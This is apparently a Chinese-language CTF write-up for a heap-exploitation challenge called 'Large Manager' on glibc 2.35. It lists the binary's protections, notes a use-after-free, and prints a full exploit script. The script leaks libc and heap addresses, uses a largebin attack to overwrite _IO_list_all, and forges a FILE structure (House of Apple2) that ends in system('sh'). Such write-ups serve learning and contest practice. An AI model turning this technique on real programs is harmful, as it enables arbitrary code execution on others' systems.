---
layout: single
title: "Large Manager"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "记录 2026 年 sh 比赛中 Large Manager 题目的分析与解题过程。"
source_folder: "Write-ups/2026/sh/Large Manager"
lang: zh-CN
excerpt: "记录 2026 年 sh 比赛中 Large Manager 题目的分析与解题过程。"
---
{% raw %}

# 信息

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
glibc 2.35
```

# 反编译

堆+io的板子题，`dele()`函数处给了uaf，给了可控的`exit()`。

`add()`函数限制了申请chunk的大小，只能申请large chunk范围的chunk。

# 思路

largebin at + apple2

# exp

```python
    add(0x488, 0, b"")
    add(0x568, 1, b"")
    add(0x478, 2, b"")
    add(0x568, 3, b"")
    dele(0)
    add(0x600, 4, b"")
    dele(2)
    show(0)
    libc.address = uu64(rn(6)) - 0x21ACE0 - 0x410
    look("libc.address")
    rn(2), rn(8)
    heap = uu64(rn(6)) - 0x290
    look("heap")
    fd_0 = libc.address + 0x21B0F0
    bk_0 = fd_0
    fd_next = heap + 0x290
    fake_ptr = flat(
        {
            0: fd_0,
            8: bk_0,
            0x10: fd_next,
            0x18: libc.sym["_IO_list_all"] - 0x20,
        },
        filler=(b"\0"),
    ).ljust(0x478, b"\0")
    syscall = libc.address + 0x91316
    edit(0, fake_ptr)
    add(0x600, 5, b"")
    heap2 = heap + 0xD00 - 0x60
    look("heap2")
    edit(1, b"\0" * 0x560 + b"  sh")
    one = one_gadget(libc_path)
    fake_IO = flat(
        {
            0x28 - 0x10: 1,
            0xA0 - 0x10: heap2 + 0x100,
            0xD8 - 0x10: libc.sym["_IO_wfile_jumps"],
            0x100: {
                0x18: 0,
                0x20: 1,
                0x30: 0,
                0xE0: heap2 + 0x200,
            },
            0x200: {
                0x68: libc.sym["system"],
            },
        },
        filler=b"\0",
    ).ljust(0x400, b"\0")

    edit(2, fake_IO)
    dbg()
    exit()
```

{% endraw %}
